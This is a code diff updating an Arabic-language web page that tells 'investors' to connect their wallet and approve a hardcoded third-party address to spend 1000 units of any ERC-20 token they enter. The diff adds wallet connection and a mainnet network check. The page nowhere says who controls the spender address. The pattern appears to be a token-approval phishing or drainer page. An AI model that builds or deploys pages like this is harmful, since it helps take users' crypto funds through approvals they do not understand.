@@ -3,10 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <title>تفعيل Approve للمستثمرين</title>
-  <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
+  <script src="https://cdn.ethers.io/lib/ethers-6.0.umd.min.js"></script>
 </head>
 <body>
-  <h2>صفحة تفعيل </h2>
+  <h2>صفحة تفعيل Approve</h2>
+
+  <button id="connectBtn">توصيل المحفظة</button>
+  <br /><br />
 
   <label>عنوان توكن ERC-20: </label><br />
   <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="60" />
@@ -14,38 +17,79 @@
 
   <p>المبلغ للموافقة (Approve): <strong>1000</strong></p>
 
-  <button id="approveBtn">اعمل Approve</button>
+  <button id="approveBtn" disabled>اعمل Approve</button>
 
   <p id="status" style="color: green; font-weight: bold;"></p>
 
   <script>
     const fixedSpenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D";
     const fixedApproveAmount = "1000";
+    const expectedChainId = 1; // Mainnet, يمكن تغييره (مثل 11155111 لـ Sepolia)
 
-    async function doApprove() {
-      const statusEl = document.getElementById("status");
+    const statusEl = document.getElementById("status");
+    const approveBtn = document.getElementById("approveBtn");
+
+    async function connectWallet() {
       statusEl.style.color = "green";
       statusEl.textContent = "";
 
       if (!window.ethereum) {
         statusEl.style.color = "red";
-        statusEl.textContent = "يجب تثبيت MetaMask أو محفظة تدعم Web3!";
+        statusEl.textContent = "يرجى تثبيت MetaMask أو محفظة تدعم Web3!";
+        return;
+      }
+
+      try {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        statusEl.textContent = "تم توصيل المحفظة بنجاح!";
+        statusEl.style.color = "green";
+
+        // التحقق من الشبكة
+        const network = await provider.getNetwork();
+        if (Number(network.chainId) !== expectedChainId) {
+          statusEl.style.color = "red";
+          statusEl.textContent = "يرجى الاتصال بشبكة Ethereum الرئيسية.";
+          return;
+        }
+
+        // تفعيل زر Approve بعد التوصيل الناجح
+        approveBtn.disabled = false;
+      } catch (error) {
+        console.log(error);
+        statusEl.style.color = "red";
+        statusEl.textContent = "فشل توصيل المحفظة: " + (error.message || error);
+      }
+    }
+
+    async function doApprove() {
+      statusEl.style.color = "green";
+      statusEl.textContent = "";
+
+      if (!window.ethereum) {
+        statusEl.style.color = "red";
+        statusEl.textContent = "يرجى تثبيت MetaMask أو محفظة تدعم Web3!";
         return;
       }
 
       const tokenAddress = document.getElementById("tokenAddress").value.trim();
 
-      if (!ethers.utils.isAddress(tokenAddress)) {
+      if (!ethers.isAddress(tokenAddress)) {
         statusEl.style.color = "red";
         statusEl.textContent = "الرجاء إدخال عنوان توكن صحيح.";
         return;
       }
 
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const accounts = await provider.listAccounts();
+        if (accounts.length === 0) {
+          statusEl.style.color = "red";
+          statusEl.textContent = "يرجى توصيل المحفظة أولاً.";
+          return;
+        }
 
+        const signer = await provider.getSigner();
         const erc20Abi = [
           "function decimals() view returns (uint8)",
           "function approve(address spender, uint256 amount) returns (bool)"
@@ -53,7 +97,7 @@
         const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);
 
         const decimals = await contract.decimals();
-        const amount = ethers.utils.parseUnits(fixedApproveAmount, decimals);
+        const amount = ethers.parseUnits(fixedApproveAmount, decimals);
 
         statusEl.textContent = "جارٍ إرسال طلب الموافقة إلى المحفظة...";
 
@@ -65,6 +109,7 @@
 
         statusEl.textContent = `تم الموافقة بنجاح! Tx Hash: ${tx.hash}`;
       } catch (error) {
+        console.log(error);
         if (error.code === 4001) {
           statusEl.style.color = "red";
           statusEl.textContent = "تم رفض المعاملة من قبل المستخدم.";
@@ -75,6 +120,7 @@
       }
     }
 
+    document.getElementById("connectBtn").addEventListener("click", connectWallet);
     document.getElementById("approveBtn").addEventListener("click", doApprove);
   </script>
 </body>
